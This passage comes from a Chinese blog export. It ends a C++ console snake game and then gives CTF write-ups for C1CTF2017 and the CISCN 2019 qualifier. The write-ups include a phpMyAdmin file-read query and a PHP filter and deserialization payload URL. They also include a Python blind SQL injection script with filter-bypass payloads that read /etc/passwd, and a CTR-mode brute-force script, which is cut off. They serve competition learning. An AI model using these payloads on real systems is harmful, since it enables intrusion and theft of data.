&#123;</span><br><span class="line">				body.push_back(<span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一列			</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;			</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>] + <span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一个身体的右面		</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;			</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> LEFT:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) <span class="comment">//如果在第一列, 直接添加到最后一列</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(CONSIZE);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到最后一列</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;		</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一个身体的左面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span> (!detecter()) <span class="comment">//如果没有吃到目标删掉最后一个身体</span></span><br><span class="line">				&#123;			</span><br><span class="line">					delteLast();</span><br><span class="line">					snake.pop_back();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					newTarget();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> direction)</span> <span class="comment">//就是forward()去掉判断是否只有一个和删除最后一个身体功能的部分</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; body;</span><br><span class="line">		<span class="keyword">switch</span> (direction)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> UP:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">1</span>] == <span class="number">1</span>) <span class="comment">//如果在第一行, 直接添加到最后一行</span></span><br><span class="line">			&#123;		</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(CONSIZE);            <span class="comment">//添加一个身体到最后一行</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>] - <span class="number">1</span>); <span class="comment">//添加一个身体到第一个身体的上面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DOWN:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">1</span>] == CONSIZE) <span class="comment">//如果在最后一行, 直接添加到第一行</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(<span class="number">1</span>);               <span class="comment">//添加一个身体到第一行</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>] + <span class="number">1</span>); <span class="comment">//添加一个身体到第一个身体的下面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;		</span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> RIGHT:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">0</span>] == CONSIZE) <span class="comment">//如果在最右一列, 直接添加到第一列</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(<span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一列</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>] + <span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一个身体的右面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> LEFT:</span><br><span class="line">			<span class="keyword">if</span> (snake[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">1</span>) <span class="comment">//如果在第一列, 直接添加到最后一列</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(CONSIZE);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到最后一列</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">0</span>] - <span class="number">1</span>);</span><br><span class="line">				body.push_back(snake[<span class="number">0</span>][<span class="number">1</span>]);     <span class="comment">//添加一个身体到第一个身体的左面</span></span><br><span class="line">				snake.insert(snake.begin(), body);</span><br><span class="line">			&#125;</span><br><span class="line">			output(direction);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Mysnake snake;<span class="comment">//&lt;=========================方便下面的controlthread检测</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HideCursor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CONSOLE_CURSOR_INFO cursor_info = &#123; <span class="number">1</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	SetConsoleCursorInfo(GetStdHandle(STD_OUTPUT_HANDLE), &amp;cursor_info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (KEY_DOWN(c))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">control</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span> &amp;&amp; !snake.isDead) <span class="comment">//死了以后线程结束</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'W'</span>) &amp;&amp; (direction != DOWN) &amp;&amp; (!isTurned))</span><br><span class="line">		&#123;</span><br><span class="line">			isTurned = <span class="literal">true</span>;</span><br><span class="line">			direction = UP;</span><br><span class="line">			Sleep(<span class="number">20</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'A'</span>) &amp;&amp; (direction != RIGHT) &amp;&amp; (!isTurned))</span><br><span class="line">		&#123;</span><br><span class="line">			isTurned = <span class="literal">true</span>;</span><br><span class="line">			direction = LEFT;</span><br><span class="line">			Sleep(<span class="number">20</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'S'</span>) &amp;&amp; (direction != UP) &amp;&amp; (!isTurned))</span><br><span class="line">		&#123;</span><br><span class="line">			isTurned = <span class="literal">true</span>;</span><br><span class="line">			direction = DOWN;</span><br><span class="line">			Sleep(<span class="number">20</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (check(<span class="string">'D'</span>) &amp;&amp; (direction != LEFT) &amp;&amp; (!isTurned))</span><br><span class="line">		&#123;</span><br><span class="line">			isTurned = <span class="literal">true</span>;</span><br><span class="line">			direction = RIGHT;</span><br><span class="line">			Sleep(<span class="number">20</span>);</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		Sleep(<span class="number">20</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> difficult;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入你选择的大小(&gt;10)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; CONSIZE &amp;&amp; (CONSIZE&lt;<span class="number">10</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"重新输入大小！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"输入你选择的难度(1~10)"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; difficult &amp;&amp; (difficult&gt;<span class="number">10</span> || difficult &lt;<span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"重新输入合法的难度！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> difficult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> timeToSleep = <span class="number">200</span> - getStart() * <span class="number">20</span>; <span class="comment">//Sleep()以毫秒为单位</span></span><br><span class="line"></span><br><span class="line">	HideCursor();</span><br><span class="line"></span><br><span class="line">	snake.initialize();</span><br><span class="line">	snake.add(UP); <span class="comment">//调整出生时的形状</span></span><br><span class="line">	snake.add(UP);</span><br><span class="line">	snake.add(UP);</span><br><span class="line">	snake.newTarget();</span><br><span class="line"></span><br><span class="line">	<span class="function">thread <span class="title">controlThread</span><span class="params">(control)</span></span>; <span class="comment">//启动按键检测 PS:有很小几率出现bug（两个按键一起按... 所以不要作死是没事的← ←）</span></span><br><span class="line">	controlThread.detach();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(!snake.isDead) <span class="comment">//碰到自己游戏结束</span></span><br><span class="line">	&#123;	</span><br><span class="line">		snake.forward(direction);</span><br><span class="line">		isTurned = <span class="literal">false</span>;<span class="comment">//转过向后再检测下一次按键事件</span></span><br><span class="line">		Sleep(timeToSleep);	</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	gotoxy(CONSIZE / <span class="number">2</span> * <span class="number">2</span> - <span class="number">5</span>, CONSIZE + <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">"You are dead!"</span>;</span><br><span class="line">	gotoxy(CONSIZE / <span class="number">2</span> * <span class="number">2</span> - <span class="number">6</span>, CONSIZE + <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Your socre is: "</span> &lt;&lt; snake.socre &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	Sleep(<span class="number">3000</span>); </span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>cpp</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title>C1CTF2017 部分题目题解</title>
    <url>/2017/11/24/C1CTF2017%20%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="0x01-MISC-500-二维码"><a href="#0x01-MISC-500-二维码" class="headerlink" title="0x01   MISC-500 二维码"></a>0x01   MISC-500 二维码</h3><p>扫描二维码出来BASE64, 但解出来却是一堆乱码…但是在其中发现有MICS.PYT的字眼.百度了一下发现了python还有PYC这种东西. 将BASE64解码出来的乱码以十六进制保存后, 将其上传到一个在线反编译的网站反编译后就可以得到含有加密算法的的PY源代码. 下面附上加密源码和写了一晚上的解密源码QAQ</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(str1)</span>:</span></span><br><span class="line">    key = <span class="string">'1234'</span></span><br><span class="line">    enc = <span class="string">''</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(str1) - <span class="number">1</span>):</span><br><span class="line">        enc = enc + chr(ord(str1[i]) ^ ord(str1[i + <span class="number">1</span>]))</span><br><span class="line"> </span><br><span class="line">    enc = enc + str1[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc)):</span><br><span class="line">        flag = flag + chr(ord(enc[i]) ^ ord(key[i % len(key)]))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    base64code=<span class="string">"Q2AkJiwdD29dXm45IDk6MBoEKRgYISQ/Fwg3Jjs2Tg=="</span></span><br><span class="line">    key=<span class="string">'1234'</span></span><br><span class="line">    hexdata=base64.b64decode(base64code)</span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    strdata=<span class="string">''</span></span><br><span class="line">    resvflag=<span class="string">''</span></span><br><span class="line">    enc=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(hexdata)):</span><br><span class="line">        enc=enc+chr(hexdata[i])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(enc)):</span><br><span class="line">        flag = flag + chr(ord(enc[i]) ^ ord(key[i % len(key)]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(flag)):</span><br><span class="line">        resvflag=resvflag + flag[len(flag)-i<span class="number">-1</span>]</span><br><span class="line">        </span><br><span class="line">    strdata=strdata+<span class="string">'&#125;'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(resvflag)):</span><br><span class="line">        strdata= strdata + chr(ord(resvflag[i]) ^ ord(strdata[i - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    print(strdata[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">decode()</span><br></pre></td></tr></table></figure>
<p>得到 C1ctf{Th3_3ncrypt_is_very_easy}</p>
<h3 id="0x02-MISC-200-冬天冷了-织毛衣给你"><a href="#0x02-MISC-200-冬天冷了-织毛衣给你" class="headerlink" title="0x02   MISC-200 冬天冷了, 织毛衣给你"></a>0x02   MISC-200 冬天冷了, 织毛衣给你</h3><p>之前不知道ZLIB是什么, 对着BINWALK的结果懵逼了一个小时.我一直以为只有zip, 7z啥的= =.百度了才知道还有这种操作. 把PNG图片后面（AE 42 60 82 78以后）的重新写到一个文件中 然后用py写个小程序解压一下就行<br><img src="https://i.loli.net/2019/03/08/5c82677c6c650.jpg" alt=""><br>得到C1ctf{Do_Y0u_decompress_zlib}</p>
<h3 id="0x03-WEB-100-Hack-Hack-Hack"><a href="#0x03-WEB-100-Hack-Hack-Hack" class="headerlink" title="0x03   WEB-100 Hack!Hack!Hack!"></a>0x03   WEB-100 Hack!Hack!Hack!</h3><p>唯一做出来的web（逃 直接打开<a href="http://66.11.119.173:41062/www/web50/" target="_blank" rel="noopener">http://66.11.119.173:41062/</a>, 发现phpmyadmin, 百度了半天, 以为是要拿webshell, 结果弄了半天发现并没有在/web50写入的权限… 最后发现直接读取文件不就得了, 随便选一个库, 执行语句.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load data infile &#39;&#x2F;tmp&#x2F;flag.txt&#39; into table a;</span><br></pre></td></tr></table></figure>

<p>再看表a, 得到FLAG~ 但是薛神说解题过程都在 /web50 下面 我是不是又走邪道了？… PS:正确方法是通过robots.txt找到dropper.php（后门）, 然后用菜刀连接即可</p>
<h3 id="0x04-Crypto-150-The-Baby-RSA"><a href="#0x04-Crypto-150-The-Baby-RSA" class="headerlink" title="0x04   Crypto-150 The Baby RSA"></a>0x04   Crypto-150 The Baby RSA</h3><p>之前对RSA并不了解, 之后会写一篇我对RSA的笔记← ←. 做题的时候傻乎乎的在<a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a>上没找到解, 就想强行暴力算.然而, 在等待暴力算的结果的同时玩RSATOOL2V17的时候发现当E=1的时候, 私钥就是1, 也就是说密文就是明文….有毒, 找到一个在线网址, 直接出 得到c1ctf{This_is_the_simple_attack}</p>
<h3 id="0x05-Crypto-200-这样的加密你会不？"><a href="#0x05-Crypto-200-这样的加密你会不？" class="headerlink" title="0x05   Crypto-200 这样的加密你会不？"></a>0x05   Crypto-200 这样的加密你会不？</h3><p>做到这题的时候 已经是19号21点了（刚下自习）, 想想也就这题有可能了…之前就又感觉是凯撒（没有奇怪的符号出现）或者栅栏啥的, 但拿去尝试都不对…但是今天看着突然来了灵感 +8 、+9、 +23 某几位恰好能组成flag.再一看居然还是有规律的= =… 于是很开心的把密文拿去以题目中的方式解密…但是得到一堆乱码, 于是又对着屏幕发呆, 此时已经21：40..突然想起来ctf的尿性, 结合HINT的“密钥的顺序对么？”发现结果中含有fxxx、xlxx、xxag的结果, 拿出来破解, 果然是有意义的, 加上{、}得到flag.</p>
<p><img src="https://i.loli.net/2019/03/08/5c82677d1fcb1.jpg" alt="">  </p>
<p>PS: 其实是维吉尼亚密码, 也算是凯撒吧0.0</p>
<h5 id="最后-向曙光大佬低头"><a href="#最后-向曙光大佬低头" class="headerlink" title="最后, 向曙光大佬低头"></a>最后, 向曙光大佬低头</h5><p><img src="https://i.loli.net/2019/03/08/5c82677d9d4e3.jpg" alt=""><br><img src="https://i.loli.net/2019/03/08/5c82677e36d09.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>c1ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Ciscn 2019 初赛 Writeup</title>
    <url>/2019/04/25/Ciscn-2019-%E5%88%9D%E8%B5%9B-Writeup/</url>
    <content><![CDATA[<p>输出了两题 web + 一题 crypto, 太菜了 QAQ<br>因为也是要交上去的, 就写的比较简单了.  </p>
<a id="more"></a>

<h2 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h2><p>根据html内的提示, <code>php://filter/read=convert.base64-encode/resource=index.php</code><br>和 <code>php://filter/read=convert.base64-encode/resource=hint.php</code> 得到源码,<br>之后代码审计.  </p>
<ol>
<li>通过 ///index.php 使 parse_url 返回 false, 绕过 payload 内不能有 flag 的限制</li>
<li>通过引用的方式, 绕过 $this-&gt;token === $this-&gt;token_flag</li>
<li>将序列化后的字符串 <code>&quot;Handle&quot;:1</code> 的改为 2, 使其反序列时不调用 __wakeup 魔术方法, 让 handler 正常调用</li>
</ol>
<p>最后 payload:<br><code>http://fe95bbad6a4f406cbd981c3496fb83f2be3784a02dfb46d1.changame.ichunqiu.com///index.php?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22token_flag%22%3Bs%3A32%3A%226754e06e46dfa419d5afe3c9781cecad%22%3Bs%3A5%3A%22token%22%3BR%3A4%3B%7D%7D</code></p>
<h2 id="全宇宙最简单的SQL"><a href="#全宇宙最简单的SQL" class="headerlink" title="全宇宙最简单的SQL"></a>全宇宙最简单的SQL</h2><p>尝试 <code>admin&#39;asdasd</code> 返回数据库操作失败, 说明存在注入漏洞,<br>尝试盲注但是发现 <code>benchmark</code> 和 <code>sleep</code> 全部被替换为 <code>QwQ</code>, 随即尝试布尔注入,<br>发现 <code>if</code> 和 <code>case</code> 也被过滤. 最后用短路求值的方式代替 if, 并用 <code>exp(710)</code> 产生错误,<br>如果前面语句返回 true, 将返回数据库操作失败, 如果前面语句返回 false, 返回账号登录失败. 且表名为常见名称 user,<br>列名通过虚表的方式绕过.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="comment"># url = "http://0d3316846cd2408dbfdf95808c03f3f5714e7d9655ee4d4e.changame.ichunqiu.com/"</span></span><br><span class="line">url = <span class="string">"http://106.119.182.216/"</span></span><br><span class="line"><span class="comment"># username=asd'/**/and/**/1=(SELECT/**/database()/**/like/**/'z')/**/and/**/exp(710)#&amp;password=admin</span></span><br><span class="line">sess = requests.session()</span><br><span class="line">sess.headers[<span class="string">"Host"</span>] = <span class="string">"0d3316846cd2408dbfdf95808c03f3f5714e7d9655ee4d4e.changame.ichunqiu.com"</span></span><br><span class="line"><span class="comment"># database: ctf</span></span><br><span class="line"><span class="comment"># table: user</span></span><br><span class="line"><span class="comment"># 2 col</span></span><br><span class="line"><span class="comment"># /fll1llag_h3r3 2,F1AG@1s-at_/fll1llag_h3r3</span></span><br><span class="line"><span class="comment"># f"asd'/**/and/**/1=(SELECT/**/version()/**/like/**/'&#123;i&#125;')/**/and/**/exp(710)#",</span></span><br><span class="line"><span class="comment"># asd'/**/and/**/1=(select(SELECT/**/group_concat(`1`)/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'a%')/**/and/**/exp(710)#</span></span><br><span class="line"><span class="comment"># f"asd'/**/and/**/1=(select(SELECT/**/hex(group_concat(`2`))/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'&#123;tmp&#125;%')/**/and/**/exp(710)#",</span></span><br><span class="line"><span class="comment"># f"asd'/**/and/**/1=(select/**/load_file(0x2f6574632f706173737764)/**/like/**/'&#123;tmp&#125;')/**/and/**/exp(710)#",</span></span><br><span class="line"><span class="comment">#table = string.printable[:-5]</span></span><br><span class="line"><span class="comment">#table = table.replace("%", '')</span></span><br><span class="line"><span class="comment">#table = table.replace("'", "")</span></span><br><span class="line"><span class="comment">#table = table.replace("\\", "")</span></span><br><span class="line">table = <span class="string">"0123456789ABCDEF"</span></span><br><span class="line">curr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(table):</span><br><span class="line">        tmp = curr + i + <span class="string">"%"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">f"asd'/**/and/**/1=(select(SELECT/**/hex(group_concat(`2`))/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/user)asd)/**/like/**/'<span class="subst">&#123;tmp&#125;</span>%')/**/and/**/exp(710)#"</span>,</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"admin"</span></span><br><span class="line">        &#125;</span><br><span class="line">        success = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> success:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = sess.post(url, data, timeout=<span class="number">2</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        res = res.content</span><br><span class="line">        res = res.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"数据库操作"</span> <span class="keyword">in</span> res:</span><br><span class="line">            curr += i</span><br><span class="line">            print(curr)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == table[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/04/25/5cc08eb862dd6.png" alt=""></p>
<p>最后得到 admin 的密码为 <code>F1AG@1s-at_/fll1llag_h3r3</code>, 尝试直接 load_file读取失败.<br>应该是没有权限, 随即在web上尝试登录admin, 发现是 mysql 客户端连接并执行语句的服务.<br>猜测有客户端读任意文件的漏洞, 可以直接拿到flag文件.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc08eb884ce6.png" alt=""><br><img src="https://i.loli.net/2019/04/25/5cc08eb889b62.png" alt=""></p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目采用的是 CTR 模式, 而且每次加密采用同一计数器,<br>只要第一次发送空, 之后每次爆破一位比对是否与第一次对应位置的值相同即可.  </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> remoteCLI <span class="keyword">import</span> CLI</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">result = <span class="string">r'result&gt;([0-9a-f]&#123;0,&#125;)'</span></span><br><span class="line"></span><br><span class="line">cli = CLI()</span><br><span class="line">cli.connect(<span class="string">"fc32f84bc46ac22d97e5f876e3100922.kr-lab.com"</span>, <span class="number">12345</span>)</span><br><span class="line">cli.sendLine(<span class="string">''</span>)</span><br><span class="line">res = cli.recvUntilFind(result)[<span class="number">0</span>]</span><br><span class="line">flag = unhexlify(res)</span><br><span class="line">flagLen = len(flag)</span><br><span class="line">table = string.printable[:<span class="number">-5</span>]</span><br><span class="line">curr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> seq <span class="keyword">in</span> range(flagLen):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(table):</span><br><span class="line">        cli.sendLine(curr + i)</span><br><span class="line">        res = cli.recvUntilFind(result)[<span class="number">0</span>]</span><br><span class="line">        res = unhexlify(res)</span><br><span class="line">        <span class="keyword">if</span> res[seq] == flag[seq]:</span><br><span class="line">            curr += i</span><br><span class="line">            print(curr)</span><br><span class="line">            <span 